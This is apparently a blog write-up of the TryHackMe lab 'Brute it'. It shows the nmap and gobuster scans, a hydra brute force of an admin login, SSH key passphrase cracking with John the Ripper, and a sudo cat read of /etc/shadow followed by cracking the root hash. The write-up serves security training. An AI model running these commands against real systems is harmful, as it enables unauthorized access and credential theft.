---
published: true
---

Well hello and welcome to another writeup of a room called brute it from tryhackme. It involves :

- Brute forcing
- Hash cracking
- Privilege Escalation

![]({{site.baseurl}}/images/brute_it/room.jpg)

Room : [Brute it](https://tryhackme.com/room/bruteit)

So lets get started.

## Scanning For Open Ports

> nmap -A IPADDR

We get the following result :


> Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 15:35 IST
 Nmap scan report for 10.10.214.54
 Host is up (0.24s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
 |   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
 |_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 55.95 seconds


We already got the answers of the first 4 questions.

So now lets hop on to the website

![]({{site.baseurl}}/images/brute_it/site.png)

## Scanning for Web Directories

> gobuster dir -u http://IPADDR -w /usr/share/wordlists/dirb/common.txt

After scanning we get a /admin directory which has the following login page. Well we don't have the username or the password but after checking the source code we get the following comment :


> <!-- Hey john, if you do not remember, the username is admin -->

Pretty secure huh?

## Hail Hydra

Now lets bruteforce the login page with hydra 

> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.118.163 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"

Explaination : 

```-l admin``` : Specifying the username

```-P /usr/share/wordlists/rockyou.txt``` : Specifying the password dictionary

```10.10.118.163``` : The Target IP

```http-post-form``` : The type of attack protocol

```/admin``` : The directory of the form

```user=^USER^&pass=^PASS^``` : The login response from the form

```Username or password invalid``` : The login message if the login failed

After running hydra we get the password ```xavier```. So lets log in.

![]({{site.baseurl}}/images/brute_it/john.png)

We get the RSA key and the web flag.

## John The Ripper

Now lets crack the id_rsa as it is requires a passpharse to login

> /opt/JohnTheRipper/ssh2John.py id_rsa > hash

> john hash --wordlist=/usr/share/wordlists/rockyou.txt

And we get the passpharse.

## Getting SSH

Lets try to log into ssh using john as a username as we saw that in the previous comment

![]({{site.baseurl}}/images/brute_it/sshlogin.png)

And we are in!! We get the user flag right away in john's directory.

## Privilege Escalation

Now lets look for SUIDs by running ``` sudo -l```

![]({{site.baseurl}}/images/brute_it/suid.png)

We can run ```cat``` as sudo. Looking on [GTFOBins](https://gtfobins.github.io/) I find that this will allow me to read any file. So now lets try to read the ```/etc/shadow``` file.

> LFILE=/etc/shadow                                                                                         
 sudo cat "$LFILE"

And we get the root hash. However I also found out that you can just cat the shadow file as sudo without doing the above process. After reading the hash i copied it over to my machine and used john to get the password.

> john --wordlist=/usr/share/wordlists/rockyou.txt rhash

Now lets login.

![]({{site.baseurl}}/images/brute_it/root.png)

There you go! We completed this challenge and got all the flags! This one was a web based challenge which is a category on which I suck but still it was pretty simple and straight forward. See you next time :)
